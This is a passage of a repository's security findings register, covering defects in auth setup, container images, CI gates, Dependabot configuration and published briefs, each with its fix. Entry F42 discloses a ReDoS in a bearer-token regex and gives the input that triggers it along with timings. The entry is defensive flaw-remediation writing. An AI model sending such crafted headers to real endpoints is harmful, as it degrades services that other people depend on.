right to make the dashboards login-gated; the *workflow* half of its fix bought nothing
the template did not already guarantee and cost the estate its deployability.

**What was NOT wrong.** `infra/bicep/apps/main.bicep` makes each app's `ingressExternal`
literally the same expression as "is Easy Auth configured for this app", so a missing
client ID has always meant *internal ingress*, never *open dashboard*. That is the
control. The workflow refusal was belt-and-braces on top of a belt that holds.

**Fix**, in three parts:

1. **Resolve, do not demand.** A new step, `Resolve the Easy Auth client IDs from their
   Entra app registrations (F36)`, runs after the OIDC login. Per app it honours an
   explicitly-set variable if there is one, and otherwise looks the registration up by the
   display name `infra/entra/manifest.json` declares for that `appKey`
   (`az ad app list --display-name … --query "[?displayName=='…'].appId"`; the exact name
   is re-asserted in the query because `az` has spelled that server-side filter both `eq`
   and `startswith`). L3 already creates all four registrations as this same identity, and
   `mls-github-deployer` holds `Application.ReadWrite.OwnedBy` (narrowed from `.All` by
   [F8](#f8)), which covers exactly the apps it created. The three variables survive as
   **overrides** for an adopter bringing their own registrations. Manifest entries gained
   an `appKey` field so the workflow never spells a display name — the company prefix is
   `naming.bicep`'s to own (CLAUDE.md).
2. **Fail safe, not closed-to-deployment.** The refusal is deleted. Whatever resolves is
   deployed; an app whose client ID does not resolve still deploys, internal-only, and the
   run says so with a `::warning` naming it and a step-summary table giving each app, its
   state, and the one command that fixes it (`gh workflow run layer-03-entra.yml`). The
   three outcomes are deliberately not conflated: **resolved** → external + Entra sign-in;
   **not found** → a documented state, not an error; **`az` failed or MORE THAN ONE
   registration matched** → an error that stops the deploy, because "the CLI was throttled"
   and "L3 has not run yet" must not look the same ([F20](#f20)'s original defect, fixed
   twice in this repo), and gating a dashboard against the wrong tenant identity is worse
   than not publishing it ([F24](#f24)'s refusal, reused).
3. **Register the reply URLs automatically.** A second new step patches each registration's
   `web.redirectUris` with `https://<fqdn>/.auth/login/aad/callback` once the FQDNs are
   known, reading the existing list first and **merging** — `--web-redirect-uris` replaces
   the whole list, so overwriting would silently drop a working URI whenever an FQDN
   changed. Already present is a no-op it states out loud. Its placement and failure
   posture are identical to the F20 and F24 remediation steps — after the V7.1 manifest is
   written and uploaded (those steps carry no `always()`), with `continue-on-error` and a
   companion step that reports a failure to `$GITHUB_STEP_SUMMARY` — because idempotent
   remediation must never fail a deployment that otherwise worked.

**Found and fixed alongside it:** the same step's `@(az …) | Where-Object` idiom returns a
bare **string** when exactly one item survives the filter, and `$x[0]` on a string is its
first *character*. `layer-07-apps.yml`'s F20 grant step had carried this since Task 22:
with the single database this estate actually has, `$dbNames[0]` evaluated to one letter,
and the contained-user grant would have been aimed at a database of that name on every
ordinary run. Both the new code and the F20 step now wrap the whole pipeline.

**Preserved, and re-asserted by test:** the fail-closed property (no client ID ⇒ no
external ingress, now asserted as the whole chain from the workflow's `GITHUB_ENV` write
through `demo.bicepparam`, `isEntraClientIdConfigured()` and `ingressExternal`); no client
secret anywhere; `excludedPaths` is `['/healthz']` and nothing else; `data-api` stays
`ingressExternal: false`.

**Not claimed:** nothing here has been deployed. The two new steps were exercised locally
against a stubbed `az` for all of their outcomes — every ID resolved, one registration
missing, a duplicate registration, a failing CLI call, a fresh registration, a
registration with an unrelated URI already listed, a registration already carrying this
URI, and an app with no client ID — and the workflow shape is asserted by
`verification/tests/frontend-auth.Tests.ps1` (25 new assertions, mutation-tested).


## F37

**The `data-api` image could not start: five non-dev packages resolve into the workspace's own `node_modules`, and the runtime stage copied only the hoisted tree**

- **Severity:** high (the serving layer both frontends fetch from never answers a request)
- **Confidence:** CONFIRMED (reproduced in CI — the image was built, booted, and died)
- **Controls:** 3.14.1 (a flaw identified and corrected); the defect itself is availability, not confidentiality
- **Closed by:** [F22](#f22)'s smoke test, on its first run
- **Status:** CLOSED

**Found while:** watching the checks that [F22](#f22) and [F33](#f33) had just made
executable for the first time. Neither this finding nor [F38](#f38) was raised by a
person reading code.

**Where:** `apps/data-api/Dockerfile`, runtime stage. It copied one dependency tree:

```dockerfile
# Workspace dependencies hoist to the repo root, so both trees come across and
# WORKDIR stays inside the workspace for Node's upward module resolution.
COPY --from=prod-deps /repo/node_modules /repo/node_modules
```

The comment is the defect. Workspace dependencies hoist to the repo root *except when
they cannot*: `apps/data-api` pins `@azure/monitor-opentelemetry-exporter` at exactly
`1.0.0-beta.32`, the root tree hoists `1.0.0-beta.44`, and npm resolves the conflict by
nesting — so that package plus `@opentelemetry/api-logs`, `@opentelemetry/core`,
`@opentelemetry/sdk-logs` and a nested `@opentelemetry/resources` live in
`apps/data-api/node_modules`. Five non-dev packages, none of them copied.

**Impact.** The image built cleanly, pushed to GHCR, and passed its Trivy scan with zero
findings — a scan of an image that cannot execute. On boot:

```
Error [ERR_MODULE_NOT_FOUND]: Cannot find package '@azure/monitor-opentelemetry-exporter'
imported from /repo/apps/data-api/dist/telemetry/otel.js
```

`dist/index.js` reaches the telemetry module before it binds a port, so the container
exits immediately and Container Apps would have crash-looped the revision. Every
control-tower and launch-ops panel reads from this API. Had the estate been deployed
before F22's test existed, this is what the first deploy would have produced.

**Fix.** Copy both trees, and stop depending on hoisting being total:

```dockerfile
COPY --from=prod-deps /repo/node_modules /repo/node_modules
COPY --from=prod-deps /repo/apps/data-api/node_modules ./node_modules
```

Node resolves upward from `WORKDIR`, so it reads the nested tree first and falls through
to the hoisted one — which is the resolution order npm built the two trees for. The
`prod-deps` stage now also `mkdir -p`s the nested path, because whether npm creates it at
all is a property of the lockfile, and a Docker `COPY` whose source is missing fails the
build.

**Found alongside it, from the same root cause.** The exact pin is not just what made the
image nest — it is what kept a vulnerable package in the tree. Of the twenty-one
`@opentelemetry/core` copies the lockfile resolved, twenty were 2.9.0 or 2.10.0 and one
was **2.0.0**: the nested copy, dragged in by the beta.32 exporter. GitHub had an open
Dependabot alert on it, CVE-2026-54285 (unbounded memory allocation in W3C Baggage
propagation, `< 2.8.0`), scope `runtime`, and the fix above would have shipped that exact
copy into the image. Moving the pin to `1.0.0-beta.44` — the version already resolved at
the root, required by `@azure/monitor-opentelemetry` — dedupes the whole subtree: one
exporter copy, no nested tree under `apps/data-api` at all, and no `@opentelemetry/core`
below 2.8.0 anywhere in the lockfile. `AzureMonitorTraceExporter` is the only symbol
`src/telemetry/otel.ts` imports from it; typecheck, build and all 295 data-api tests
(27 of them telemetry) pass unchanged on beta.44.

The Dockerfile fix stays even though nothing nests any more, and that is deliberate: it
is not a workaround for this pin, it is the correct way to copy a workspace's production
tree. Whether npm nests is a property of the lockfile on any given day, and the next
version conflict must not be able to reproduce this. The `mkdir -p` in `prod-deps` is
what makes the `COPY` valid in the state the tree is now actually in — an empty nested
directory.

**Why nothing caught it.** Not one build-time or test-time check could see it. `npm ci`,
`tsc`, `vitest` and the typecheck all pass against a working tree that has both
directories present, which is every developer machine and every CI runner — the
`package.json` pin that caused the nesting is a defect only in combination with a
Dockerfile that copies one of the two trees, and neither half is wrong on its own. The
failure existed only in the image, and until [F22](#f22) nothing in this repository ever
ran an image. `apps/mcp-tools` was
checked for the same shape and does not have it: it carries a standalone lockfile,
installs into `apps/mcp-tools/node_modules`, and copies that directory wholesale.

## F38

**Three shipped images sat sixteen months behind Alpine's security updates, on an `nginx` tag that had stopped being rebuilt without ever changing its name**

- **Severity:** medium (the CVE reached is not exploitable on the platform these images run; the sixteen-month gap is the finding)
- **Confidence:** CONFIRMED
- **Controls:** 3.4.1 (baseline configuration), 3.14.1 (flaw remediation)
- **Closed by:** [F33](#f33)'s Trivy repin, on its first real scan
- **Status:** CLOSED

**Found while:** the same watch as [F37](#f37). [F33](#f33) recorded that
`aquasecurity/trivy-action@0.28.0` resolved to no ref at all, which meant every "Trivy
gate — fail the build on CRITICAL" step in this repository had been passing without
scanning anything. Repinning it to a commit SHA made the gate real, and its first
execution failed:

```
libcrypto3  CVE-2026-31789  CRITICAL  fixed  3.3.3-r0 -> 3.3.7-r0  openssl: heap buffer
libssl3                                                            overflow on 32-bit
```

**Where:** `apps/compliance/Dockerfile`, `apps/control-tower/Dockerfile` and
`apps/launch-ops/Dockerfile`, each `FROM nginx:1.27-alpine`.

**What is NOT the finding.** CVE-2026-31789 is a heap overflow parsing oversized X.509
certificates *on 32-bit systems*. These images are `linux/amd64`. Reported as an
exploitable exposure it would be an overstatement, and this register does not make
overstatements.

**What is.** Why a package that far out of date was in a shipped image at all. Docker
Hub last rebuilt `nginx:1.27-alpine` on **2025-04-16**. 1.27 is an end-of-line release:
the tag keeps its name indefinitely while quietly ceasing to receive base rebuilds, so
`FROM nginx:1.27-alpine` in August 2026 pulls a bit-for-bit copy of an April 2025
filesystem. Sixteen months of Alpine security updates — all of them, not only this
openssl fix — were absent from three images this repository publishes, and the pin gave
every appearance of being a responsible one. A version pin naming a dead line is
indistinguishable from a maintained one by inspection.

**Fix**, in two parts:

1. **`nginx:1.31-alpine`** — current mainline, rebuilt 2026-08-20 — in all three
   Dockerfiles. The three non-root fixes below each `FROM` (deleting `user  nginx;`,
   redirecting the pid file to `/tmp`, creating and chowning `/var/cache/nginx`) are
   unchanged, and are no longer merely asserted to work: [F22](#f22)'s smoke test boots
   each image and fails the build if the app is not served, which is what a silently
   skipped `envsubst` pass or an unwritable pid path produces.
2. **A `docker` ecosystem in `.github/dependabot.yml`**, which is the part that matters.
   The file had `npm` (nine directories), `pip` and `github-actions` — and nothing
   reading a `FROM` line, in a repository whose own Dependabot header warns that a wrong
   directory glob means no PRs ever fire. Five entries now cover the five app
   Dockerfiles, one per directory rather than a `directories:` glob, so each path is
   checkable by eye. That converts "the base image went stale" from something a scanner
   discovers after publication into a bump PR that arrives on a Monday.

**The pattern F37 and F38 share, and it is the one worth keeping.** Both were found by
checks that had existed for some time and had never executed — F22's smoke test because
it was only written on 2026-08-28, F33's Trivy gate because it was pinned to a
nonexistent ref. Neither defect was reachable by reading the repository: one lived in a
container image, the other in a registry's rebuild history. Every gate here should be
assumed inert until its first failure proves otherwise, and these two findings are that
proof arriving.


## F39

**The Trivy CRITICAL gate and the F22 smoke test were advisory: not one of the five image jobs was a required status check, so a pull request could merge with either of them red**

- **Severity:** high (every container-image security and correctness gate in the repository was non-binding)
- **Confidence:** CONFIRMED (read directly off the live ruleset)
- **Controls:** 3.4.3 (track, review, approve or disapprove, and log changes), 3.14.1 (flaw remediation — a flaw-finding gate that cannot block is not remediation)
- **Closed by:** raised and closed alongside [F37](#f37) and [F38](#f38)
- **Status:** CLOSED

**Found while:** preparing to merge the F37/F38 fixes, by asking what the branch ruleset
would actually have done if those checks had stayed red.

**Where:** the `main protection` ruleset. Its `required_status_checks` were exactly seven:

```
PSScriptAnalyzer + Pester        analyze (javascript-typescript)
vitest (npm workspace)           analyze (python)
actionlint (workflows)           scan history for secrets
pytest (data generators)
```

Every one of those is a lint, test or static-analysis check. **No image job.** The Trivy
CRITICAL gate and F22's boot smoke test live only in the five `app-*-ci.yml` workflows,
they ran, they reported — and nothing consumed the result. A red image check on a pull
request was a red mark next to a green merge button.

**Impact, concretely.** The pull request that fixed [F37](#f37) and [F38](#f38) could have
been merged with both defects still in it. So could the commits that introduced them.
`app-compliance-ci` had been failing on `main` for a full day, and `main` is the branch
this repository publishes: the ruleset had nothing to say about it. The gates were doing
their job perfectly and the repository was not listening.

**Why it was not simply "add five checks to the ruleset".** The five workflows carried
`paths:` filters on both their `push` and `pull_request` triggers. A required check whose
workflow does not run never reports a conclusion, and GitHub holds the pull request
pending rather than passing it — so requiring a path-filtered check deadlocks every pull
request the filter misses. The tempting fix for *that* is to drop the requirement again,
which is how a gate quietly stops binding a second time.

**Fix**, in three parts:

1. **The `paths:` filter comes off the `pull_request` trigger** in all five workflows and
   stays on `push`. Nothing is gated on a push run, so skipping work there is free; on a
   pull request the check must be able to report. The cost is one container build per
   pull request and it is not a push — the build step is `push: false` on pull requests
   and both the GHCR login and push steps are `if: github.event_name != 'pull_request'`,
   verified step by step across all five workflows rather than assumed. A pull-request run
   writes nothing to the registry and spends only Actions time, which is free on a public
   repository.
2. **Each image job is named after its app** — `container build, scan and push
   (compliance)` and so on. A required status check is matched by the check run's *name*,
   and five check runs sharing one name cannot be required individually.
3. **All five names are added to the ruleset's required checks**, taking it from seven
   required checks to twelve.

**Asserted by test, and mutation-tested.** `verification/tests/app-ci-smoke-test.Tests.ps1`
gains 26 assertions (F39 block) covering all five properties this rests on: the
`pull_request` trigger has no `paths:`/`paths-ignore:` key, the `push` trigger still has
one, the image job's name matches its app, all five names are distinct, and the image job
carries no job-level `if:` (a job that evaluates false reports *skipped*, and a skipped
required check deadlocks the pull request instead of failing it honestly). Five surgical
mutations were run against those assertions — re-adding a `pull_request` `paths:` filter,
collapsing a job back to the shared name, colliding two names, adding an `if:` to an image
job, and stripping the `push` filter — and each was caught by the assertion meant to catch
it. The suite went from 81 to 107 tests on that file, 762 to 788 across
`verification/tests` and `compliance/tests`.

**What this does not fix, stated plainly.**

*The ruleset still has an admin bypass.* `bypass_actors` is
`[{RepositoryRole 5, bypass_mode: always}]` — the repository admin. So "required" means
required of Dependabot, of `--auto` merges, of any outside contributor, and of the merge
button's normal path; it does **not** mean the owner is physically prevented from merging
red. That escape hatch is deliberate on a single-owner demo repository — removing it can
lock the owner out of their own default branch — but the honest statement of what changed
is *the gate can now block*, not *the gate cannot be overridden*. The five checks were
non-binding on everyone before this; they are now binding on everyone except one person
who has to choose to override them and leaves a record when they do.

*Self-heal is unchanged.* A heal pull request touching `apps/vuln-lab/**` now builds and
scans five images it does not change — wasted work rather than a hazard — and still scans
no image of its own, exactly as `self-heal.yml`'s header already states ([F29](#f29)).

*There is a rebase window.* Open Dependabot pull requests raised before this change report
the old check name and will sit pending on the five new ones until Dependabot rebases them
onto the new `main`.


## F40

**`dependabot.yml` instructed adopters to disable Dependabot security updates — the only fix generator the L10 showpiece has — and the contradiction was documented rather than fixed**

- **Severity:** medium (no security control is weakened; an adopter following it silently loses half the self-healing showpiece)
- **Confidence:** CONFIRMED (both files read against the live repository setting and against `self-heal.yml`'s dependabot lane)
- **Controls:** — (adoptability)
- **Closed by:** raised and closed alongside [F39](#f39)
- **Status:** CLOSED

**Found while:** checking why three Dependabot pull requests existed against
`apps/vuln-lab` when `dependabot.yml` sets `open-pull-requests-limit: 0` for that
directory. They exist because that option caps *version* updates only — GitHub documents
that "security update pull requests are not subject to this limit" — so the three PRs are
the showpiece working, not a leak.

**Where:** `.github/dependabot.yml`, the `/apps/vuln-lab` entry, which said:

> Same reasoning applies to the repo-level "Dependabot security updates" setting: leave it
> OFF, or it will race self-heal.yml for these three CVEs.

That is pre-amendment guidance and it is wrong twice over. The 2026-08-24 amendment made
the setting **ON** deliberately: Copilot Autofix does not generate fixes for dependency
alerts, and no API can request a security-update PR on demand, so Dependabot's own PR is
the *only* fix generator that exists for the three seeded `apps/vuln-lab` CVEs. And
`self-heal.yml` no longer races it — its "Dependabot security update -> gauntlet" job
finds Dependabot's PR and arms auto-merge on it, which is the documented design in
`.github/README.md` § "Repository settings this layer assumes".

**What makes this a finding rather than a typo.** The contradiction was already known.
`.github/README.md` carried a bullet reading *"Stale comment, other workstream's file:
`dependabot.yml` still carries a pre-amendment comment instructing that security updates
be left off. That guidance is now wrong; the file belongs to L9 and was not edited
here."* So for four days the repository shipped a wrong instruction, a correct
instruction, and a note explaining that the wrong one was known to be wrong and had not
been corrected because of workstream ownership. In a repository whose entire premise is
being cloned into someone else's tenant, workstream ownership is not a reason to leave a
harmful instruction in place — an adopter reads the comment next to the setting, not the
disclaimer three files away.

**Fix.** `dependabot.yml`'s comment now states the correct behaviour and says why: the
limit caps version updates only, security-update PRs are exempt by design, the repo-level
setting must be **ON**, and self-heal adopts the resulting PR. `.github/README.md`'s
bullet no longer records a known-stale comment; it records that the comment was corrected
and what following it would have cost. Verified against the live repository: `GET
/repos/{o}/{r}/automated-security-fixes` returns `{"enabled": true, "paused": false}`,
which is what both documents now say it should be.


## F41

**The compliance state artifact became its own trigger: merging it re-ran the workflow that produced it, and seven abandoned branches had accumulated while `main`'s state sat seven commits behind**

- **Severity:** medium (no control is weakened; the flagship deliverable's published provenance is stale and the loop is unbounded)
- **Confidence:** CONFIRMED — observed, not predicted. Merging PR #44 triggered `compliance.yml` at 03:56 on the merge commit `97beb7f`.
- **Controls:** 3.12.3 (monitor security controls on an ongoing basis — the board is that monitoring's output)
- **Closed by:** raised and closed 2026-08-29
- **Status:** CLOSED

**Found while:** merging [F37](#f37)/[F38](#f38) and noticing seven
`compliance-state/*` branches on the remote, one per push to `main` since branch
protection was enabled.

**Two defects, one cause.** `compliance.yml`'s commit job used to push the artifact
straight to `main` with `GITHUB_TOKEN`, and that route was loop-free *by construction*:
"events triggered by the GITHUB_TOKEN will not create a new workflow run" — GitHub's
recursion guard, which the step's own comment still names as the thing it relies on.
Branch protection ended that route. The direct push is now refused, and the workflow
falls back — deliberately, and documented — to pushing a branch and asking a human to
open the pull request, because opening one itself needs "Allow GitHub Actions to create
and approve pull requests" and that same toggle grants self-approval.

1. **Nobody clicked.** Seven branches, and `compliance/state/` on `main` stamped
   `9d7a0b1` while `main` moved on seven times. The headline counts never changed
   (0 COMPLIANT / 15 PARTIAL / 1 GAP / 94 NOT_ASSESSED of 110), so nothing looked
   wrong — but the provenance stamp and the evidence behind 3.14.1 were stale, and
   `apps/compliance` bakes that exact file into its image at build time.
2. **Clicking would not have ended it.** `on: push: branches: [main]` carried no path
   filter, and a pull-request merge is a *human* push, which does trigger workflows. The
   artifact stamps itself with `github.sha`, so the regenerated file always differs from
   the one just merged: commit, refused push, new branch, new PR. One more every time
   someone merges the last one. This is what PR #44's merge demonstrated.

**Fix.** `paths-ignore: compliance/state/**` on the push trigger. Regenerating a file
because that file changed is circular; the nightly cron is untouched and is what actually
keeps the artifact fresh.

**What this does not do, stated plainly.** It does not make the route automatic. The
artifact still lands by a human-opened pull request, because this repository will not
enable the Actions setting that would let a workflow open — and therefore approve — its
own. What it does is bound the work: one pull request per real change, instead of one per
merge forever.

## F42

**Polynomial ReDoS in the inbound `Authorization` parse — on the gate standing in front of an endpoint that is public by design**

- **Severity:** high (CodeQL's own rating; the endpoint is externally reachable in every deployed configuration and the parse runs before authentication)
- **Confidence:** CONFIRMED — measured, not inferred: 7ms at 2k whitespace characters, 59ms at 6k, 201ms at 12k, ~5.1s at 60k. Quadratic.
- **Controls:** 3.13.1 (protect communications at system boundaries), 3.14.1 (flaw remediation)
- **Closed by:** CodeQL alert #1, raised and closed 2026-08-29
- **Status:** CLOSED

**Found while:** reading the repository's own open CodeQL alerts during the dependency
sweep. Nine were open; seven are quality rules or the deliberate `apps/vuln-lab` seeds.
Two were on real production code, and both were in the same file:
`apps/mcp-tools/src/auth-gate.ts`, the inbound gate whose module doc opens by explaining
that the container app runs `ingressExternal: true` unconditionally.

**Where.** `presentedCredential` parsed the header with `/^Bearer[ \t]+(.+)$/i`.
`[ \t]+` and `.+` can both match a run of spaces and tabs, so a header carrying n
whitespace characters has O(n) ways to split it between them, and the anchored `$` forces
the engine to try every one before the match can fail. One header, one unauthenticated
POST, seconds of CPU — on an endpoint whose whole threat model is that anyone who finds
the FQDN can reach it.

**Fix.** `/^Bearer[ \t]+([^ \t].*)$/i`. Requiring the capture to begin with a non-space
makes the split unique, so the match is linear: a flat 0.03ms on the same inputs.
Behaviour is unchanged for every real credential; an all-whitespace bearer value now falls
through to `x-api-key` rather than being returned as `""`, which was never a credential.

**THE FIRST REGRESSION TEST WAS HOLLOW, and only mutation testing found it.** It sent
`"Bearer" + "\t".repeat(200_000)` and asserted a time bound — and passed with the
vulnerable pattern restored, because `header.trim()` runs before the regex and strips
every trailing tab, leaving it to match `"Bearer"` and fail instantly. A guard that cannot
fail is worse than no guard, and nothing but the mutation would have said so. What
actually backtracks needs a whitespace run that survives `trim` **and** a tail the pattern
cannot match to the anchor: `.` does not match a newline and there is no `m` flag, so
`"a\nb"` makes `$` unreachable. The corrected test uses 60k tabs plus that tail and a
1000ms bound; re-mutated, the vulnerable pattern fails it at **5099ms**. This is the third
hollow test this register has recorded ([F27](#f27) matched comment text, and one of the
controller's own commits asserted with literal backspace characters) and the second caught
only by deliberately breaking the code under it.

**The second alert on the same file is a false positive, and is dismissed as one rather
than silenced.** CodeQL raised `js/insufficient-password-hash` (HIGH) on the two
`createHash("sha256")` calls in `secretsMatch`. The rule is right about the shape and
wrong about the situation: nothing is stored — both digests are computed per request,
compared and dropped; the input is `mcp-auth-token`, a machine-generated high-entropy
value injected from Key Vault, not a human-chosen password with a dictionary behind it;
and the hash is not the control, `timingSafeEqual` is — the digests exist only to make two
arbitrary-length strings the same width so the comparison is legal and leaks no length.
The rule's suggested remedy would make things worse: a per-request slow KDF on a public
endpoint is a denial-of-service amplifier handed to any unauthenticated caller. Alert #3
is dismissed in GitHub with reason `false positive` and that rationale, and the full
argument is written above `secretsMatch` so the next reader does not have to reconstruct
it from a dismissal comment.

**A verification failure from the same sweep, recorded because it is the same shape as
the findings around it.** The dependency sweep that produced F41 and F42 also bumped
TypeScript from 5.9 to 7.0.2 across seven workspaces. It was verified with `typecheck`
and `npm test`, both of which passed everywhere, and committed on that basis. It was
wrong. `npm run build` — a gate this repository already has, and one CI runs on every
pull request — fails in `apps/shared/spec-renderer`: `tsup` bundles
`rollup-plugin-dts@6.1.1`, which embeds `typescript@5.7.3`, and it dies generating the
declaration bundle with `TypeError: Cannot read properties of undefined (reading
'useCaseSensitiveFileNames')`. tsup 8.5.1 is the current release; there is no version
that supports TypeScript 7 yet. The JavaScript output built fine, so nothing but the
declaration step ever complained.

Three commits carried that claim before the build gate was run. Nobody was misled,
because it never left the branch — but the mechanism is exactly [F22](#f22)'s, exactly
[F33](#f33)'s and exactly [F39](#f39)'s, and this time the person skipping the available
gate was the one writing the findings about skipping available gates. **A gate you own
and do not run is indistinguishable from a gate that does not exist.** TypeScript stays
at ^5.9.3; Dependabot's six TypeScript 7 pull requests should be closed with this reason
rather than merged when they are re-proposed.

Two dependency majors that DID hold are worth naming for the same reason, because both
first appeared to fail for the same wrong reason. React 19 and vite 8 each left two
copies of themselves in the tree — a hoisted 18.3.1 / 6.4.3 beside the nested 19.2.8 /
8.2.2 — which is [F37](#f37)'s shape a third and fourth time. `overrides` did not
dislodge either across two lockfile regenerations; `npm dedupe` collapsed both to a
single copy immediately. vite 8 had been abandoned once on the strength of the failed
`overrides` attempt before `npm dedupe` was tried on React and turned out to be the tool
that works.


## F43

**The G0 gate's own definition asserts two verifications that `verify-g0.ps1` does not perform, and one required variable was documented nowhere at all**

- **Severity:** high (nothing is broken today; every item costs irreplaceable budget once the 30-day clock is running)
- **Confidence:** CONFIRMED — each item read directly off the script it describes
- **Controls:** — (adoptability)
- **Closed by:** the G0 rehearsal, 2026-08-29
- **Status:** CLOSED

**Found while:** rehearsing G0 deliberately *before* the Azure free-trial clock starts.
The four bootstrap scripts are 1,489 lines with 63 passing Pester tests, all against
mocks, and **not one line has ever executed against a real tenant** — the same
never-actually-ran condition as [F22](#f22), [F33](#f33) and [F39](#f39). A defect found
on day 3 of 30 costs budget that cannot be bought back; found now it costs an afternoon.
Five defects surfaced, and the two serious ones are both in `§ D`, the section that
*defines* what "G0 complete" means.

**1. `§ D` claimed a Power Platform verification that does not exist (high).** It said a
green `verify-g0.ps1` confirms "a production-or-sandbox Power Platform environment linked
to a Copilot Studio pay-as-you-go billing plan on this subscription". There is no such
check: `grep -i powerplatform scripts/bootstrap/verify-g0.ps1` returns nothing. The script
runs exactly ten checks and none of them touches Power Platform. C5 is fifteen minutes of
portal work that blocks L8 entirely, and an operator who skipped it would have read a
green gate as confirmation.

**2. `§ D` overstated the Fabric check (medium).** It said "Fabric capacity visible with SP
API access on". The check calls the Fabric API **as the logged-in human**, not as
`mls-github-deployer`, so it proves your account can see a capacity and says nothing about
whether service principals can call Fabric at all — which is exactly what C4's toggle
switches on. The check's own output has always been honest about this; it prints
`(SP API toggle is portal-verified)`. The runbook was not.

> **SUPERSEDED THE NEXT DAY by [F46](#f46), and the correction matters more than the
> finding.** This section went on to say C4 was portal work "with no read path this script
> can use under your login" and had to be confirmed by eye. That was **wrong**. The Fabric
> admin API returns every tenant setting to a Fabric or Global administrator at
> `GET https://api.fabric.microsoft.com/v1/admin/tenantsettings`, and `verify-g0.ps1` now
> checks C4 there (`FabricSpAccess`). Writing that check immediately found a live defect
> the prose had concealed: **C4 is not one toggle but five**, and the one L5 actually
> depends on — `ServicePrincipalAccessGlobalAPIs`, workspace creation — was **off** while
> the similarly-named `ServicePrincipalAccessPermissionAPIs` was on.
>
> The lesson is not that this finding was careless. It is that **"unverifiable" was
> asserted without trying**, in a document whose whole subject is claims made without
> checking. The same sentence still stands over C5 (the Power Platform billing plan), and
> it should now be read as a to-do rather than a fact.

**3. `PURVIEW_APP_ID` was documented in no runbook in this repository (medium).**
`layer-04-purview.yml` gates its apply job on all three of `PURVIEW_APP_ID`,
`PURVIEW_ORGANIZATION` and `PURVIEW_CERT_BASE64`; C9b's table named only the certificate
pair. An operator could set precisely what the runbook asked for, watch L4 run green, and
still have no sensitivity labels applied — [F18](#f18)'s effect reached by a different
route. It fails safe, which is why nothing broke loudly, but "fails safe" and "does what
you asked" are different things.

**4. `§ C` item 3 understated `mls-verifier`'s Graph permissions (low).** It named Reader +
`Directory.Read.All`. The script has always granted `Policy.Read.All` as well, which is
what lets V3.3 read Conditional Access policy state — the enforced-MFA audit cannot see
the policy without it. An inaccurate least-privilege inventory in a compliance demo is
worth more than a low severity suggests.

**5. `§ C` item 8 omitted the forecast budget alerts (low).** It named actual alerts at
50/80/100% and not the forecast alerts at 50/80% that `03-budget.ps1` also creates. The
forecast pair is the half that warns before the money is gone rather than after.

**Fix.** `§ D` now enumerates all ten checks in a table instead of describing them in
prose, and states plainly that **C4 and C5 are verified by nothing** and must be confirmed
by eye. `PURVIEW_APP_ID` is documented with the `gh variable set` line and a warning that
all three values are required. Items 3 and 8 now match their scripts.

**What was deliberately NOT done.** An eleventh check against the Power Platform admin API
(`api.bap.microsoft.com/.../scopes/admin/environments`) would close item 1 properly and is
not shipped, because it cannot be exercised before a tenant exists. Shipping an untested
check into the gate would be this register's most-repeated defect committed knowingly. The
honest gap is documented instead.

**What the rehearsal did NOT find, which is worth recording too.** `up.ps1`'s
"refuses to dispatch until the first four variables exist" claim is exactly true, and the
four it requires are the four C9 lists first. `01-root-oidc.ps1` matches every claim `§ C`
item 3 makes about federation subjects, the `demo`/`verify` split and the five deployer
Graph permissions. C9 does tell you to create both GitHub environments. The scripts are in
better shape than the prose describing them — which is the opposite of the usual direction
here, and the reason the audit was worth doing rather than assumed.

## F44

**The published leadership brief still carried F28's exact false claim, in the document most likely to be handed to someone**

- **Severity:** high (a security claim, stated to an external audience, that this register had already recorded as false)
- **Confidence:** CONFIRMED
- **Controls:** 3.1.3 (control the flow of CUI — here, the accuracy of what is asserted about credential handling)
- **Closed by:** the documentation refresh, 2026-08-29
- **Status:** CLOSED

**Found while:** refreshing the presentation documents for staleness after the dependency
sweep. The search was for out-of-date numbers. It found a false security claim instead.

**Where.** `docs/briefs/readiness-brief.html` — seven pages, exported to
`Meridian-Readiness-Brief.pdf`, audience "engineering, security and operations
leadership" — under the heading *"No stored cloud credentials, anywhere"*:

> Continuous integration holds no secret at all — a property that is asserted, not assumed.

That sentence is [F28](#f28) verbatim. F28 is titled *"'No secrets in CI' is false — six
long-lived credentials"*, it is marked CLOSED, and `CLAUDE.md`'s hard rule 5 names it
explicitly: *"CI is not secret-free, and claiming it was is finding F28."* The claim was
corrected across the repository on 2026-08-28 and **this document was never swept**, so
the one artifact designed to be printed and handed to people kept the version that had
already been found false. "A property that is asserted, not assumed" made it worse: it
claimed rigour for the part that was wrong.

**Also wrong, in the board one-pager** (`board-one-pager.html`, one page, audience "board
/ executive committee"): its five-number stat block said **1,428 automated tests** against
an actual 2,342, **43 independently verified controls** against an actual 45 (V1.1–V11.5),
and **"0 Stored cloud credentials"** — the same over-broad claim as the readiness brief,
compressed to three words on the single page an executive reads.

**Fix.** The readiness brief's heading becomes "No stored Azure credentials"; the body
keeps the true part (nothing authenticating to **Azure** is a stored secret — federation
and managed identity throughout, Entra-only SQL) and gains a qualifier paragraph naming
all six long-lived credentials, why each exists, and that an earlier revision said
otherwise. The one-pager's stat block is corrected to 45 / 2,342 / "0 Stored **Azure**
credentials", which is the strong claim that happens to be true. **Both PDFs were
regenerated** — an HTML fix alone would have left the false sentence in the artifact that
actually circulates. Page counts are unchanged (1 / 7 / 5), so `docs/briefs/README.md`
stays accurate. `kickoff-prompt.html` is deliberately untouched: its README declares it a
document of record, not a description of the current system.

**The stale numbers found alongside it**, all corrected: `docs/BY-THE-NUMBERS.md` (tracked
files, authored lines, every per-language and per-directory row, and a headline that
disagreed with its own section heading — 2,154 against 2,260); `README.md`'s gate table
and key-documents line; `compliance/README.md`'s finding count; and the G0 runbook's
"Pester 597".

**The pattern, and the one durable defence against it.** `compliance/README.md`'s finding
count has now gone stale **twice** — it said "24 findings" until 2026-08-28, was corrected
to 36, and was stale again within a day at 42. A count written in prose beside a file that
grows will be wrong again, and the third correction will not be the last. What has *never*
drifted is the structure, because `compliance/tests/register.Tests.ps1` derives the finding
numbers from the document and asserts they run contiguously from F1 rather than trusting
any sentence about how many there are. Prose counts are checked by whoever remembers;
derived counts are checked every run.


## F45

**Every label `dependabot.yml` declares was never created in the repository, so all 42 Dependabot pull requests carried an error comment and none was ever labelled**

- **Severity:** low (no security or correctness impact; it degraded the signal-to-noise of the one channel that reports dependency risk)
- **Confidence:** CONFIRMED — counted directly: 42 `### Labels` comments across Dependabot's pull requests
- **Controls:** — (operability)
- **Closed by:** raised and closed 2026-08-29
- **Status:** CLOSED

**Found while:** the sponsor asked why they had received so many Dependabot messages. The
answer was not the volume of pull requests.

